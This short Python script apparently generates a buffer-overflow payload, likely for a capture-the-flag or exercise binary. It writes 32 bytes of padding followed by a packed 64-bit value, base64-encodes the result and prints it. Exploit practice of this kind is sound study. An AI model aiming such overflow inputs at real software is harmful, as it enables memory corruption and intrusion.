
import sys
import struct
import base64

buf = b'cccccccccccccccccccccccccccccccc'
buf += struct.pack('<Q', 11166012873503991109)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
